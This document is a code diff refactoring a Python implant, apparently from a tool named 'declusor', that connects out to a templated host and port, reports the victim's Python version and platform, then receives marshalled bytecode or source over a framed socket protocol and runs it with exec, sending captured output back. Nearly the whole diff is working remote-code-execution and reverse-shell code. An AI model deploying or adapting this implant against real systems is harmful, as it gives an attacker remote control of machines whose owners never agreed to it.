@@ -1,5 +1,3 @@
-# type: ignore
-
 import importlib.util
 import io
 import json
@@ -13,20 +11,17 @@ import sys
 import tempfile
 from contextlib import suppress
 
-HOST = "$DECLUSOR_HOST"
-PORT = int("$DECLUSOR_PORT")
-ACKNOWLEDGE = bytes.fromhex("$DECLUSOR_ACK")
-CHANNEL_PROCESS_EXIT = int("$DECLUSOR_CH_EXIT")
-CHANNEL_STDOUT = int("$DECLUSOR_CH_STDOUT")
-CHANNEL_STDERR = int("$DECLUSOR_CH_STDERR")
-CHANNEL_STDIN = int("$DECLUSOR_CH_STDIN")
-CHANNEL_SIGNAL = int("$DECLUSOR_CH_SIGNAL")
-CHANNEL_HEARTBEAT = int("$DECLUSOR_CH_HEARTBEAT")
+HOST, PORT, ACK = ("$DECLUSOR_HOST", int("$DECLUSOR_PORT"), bytes.fromhex("$DECLUSOR_ACK"))
+CH_EXIT = int("$DECLUSOR_CH_EXIT")
+CH_STDOUT = int("$DECLUSOR_CH_STDOUT")
+CH_STDERR = int("$DECLUSOR_CH_STDERR")
+CH_STDIN = int("$DECLUSOR_CH_STDIN")
+CH_SIGNAL = int("$DECLUSOR_CH_SIGNAL")
+CH_HEARTBEAT = int("$DECLUSOR_CH_HEARTBEAT")
 MAX_TLV_FRAME_SIZE = int("$DECLUSOR_MAX_TLV_FRAME_SIZE")
+SESSION_SCOPE: dict[str, object] = {"__name__": "__declusor__"}
 
-_SESSION_SCOPE = {"__name__": "__declusor__"}
-_CODE_TYPE = type((lambda: None).__code__)
-
+CodeType = type((lambda: None).__code__)
 
 def _read_exact(sock: socket.socket, length: int) -> bytes | None:
     buf = bytearray()
@@ -49,6 +44,7 @@ def _read_frame(sock: socket.socket) -> tuple[int, bytes] | None:
         return None
 
     channel, length = struct.unpack(">BI", header)
+
     if length > MAX_TLV_FRAME_SIZE:
         raise ValueError(f"TLV frame payload exceeds maximum size of {MAX_TLV_FRAME_SIZE} bytes.")
 
@@ -75,9 +71,11 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
         sys.stdout = sys.stderr = buf
 
         code = None
+
         try:
             obj = marshal.loads(payload_bytes)
-            if isinstance(obj, _CODE_TYPE):
+
+            if isinstance(obj, CodeType):
                 code = obj
         except Exception:
             pass
@@ -86,7 +84,7 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
             source = payload_bytes.decode(errors="replace")
             code = compile(source, "<remote>", "exec")
 
-        exec(code, _SESSION_SCOPE)  # noqa: S102
+        exec(code, SESSION_SCOPE)  # noqa: S102
     except (Exception, SystemExit) as exc:
         buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
     finally:
@@ -95,36 +93,38 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
     output = buf.getvalue().encode(errors="replace")
 
     if output:
-        _send_frame(sock, CHANNEL_STDOUT, output)
+        _send_frame(sock, CH_STDOUT, output)
 
-    _send_frame(sock, CHANNEL_PROCESS_EXIT, b"")
+    _send_frame(sock, CH_EXIT, b"")
 
 
 def main() -> None:
     with socket.create_connection((HOST, PORT)) as sock:
-        _SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)
+        SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)
 
-        magic_hex = importlib.util.MAGIC_NUMBER.hex()
         metadata = json.dumps(
             {
                 "version": list(sys.version_info[:3]),
-                "magic": magic_hex,
+                "magic": importlib.util.MAGIC_NUMBER.hex(),
                 "platform": sys.platform,
                 "implementation": platform.python_implementation(),
             }
         ).encode("utf-8")
 
-        _send_frame(sock, CHANNEL_STDOUT, metadata)
+        _send_frame(sock, CH_STDOUT, metadata)
 
         helpers_frame = _read_frame(sock)
 
         if helpers_frame is not None:
             _, helpers_bytes = helpers_frame
+
             try:
                 helpers_code = None
+
                 try:
                     obj = marshal.loads(helpers_bytes)
-                    if isinstance(obj, _CODE_TYPE):
+
+                    if isinstance(obj, CodeType):
                         helpers_code = obj
                 except Exception:
                     pass
@@ -132,21 +132,20 @@ def main() -> None:
                 if helpers_code is None:
                     helpers_code = compile(helpers_bytes.decode(errors="replace"), "<helpers>", "exec")
 
-                exec(helpers_code, _SESSION_SCOPE)
+                exec(helpers_code, SESSION_SCOPE)
             except (Exception, SystemExit):
                 pass
 
-        sock.sendall(ACKNOWLEDGE)
+        sock.sendall(ACK)
 
         while (frame := _read_frame(sock)) is not None:
             channel, payload_bytes = frame
 
-            if channel == CHANNEL_HEARTBEAT:
-                _send_frame(sock, CHANNEL_HEARTBEAT, b"")
+            if channel == CH_HEARTBEAT:
+                _send_frame(sock, CH_HEARTBEAT, b"")
                 continue
 
             _execute(payload_bytes, sock)
-
 
 
 if __name__ == "__main__":
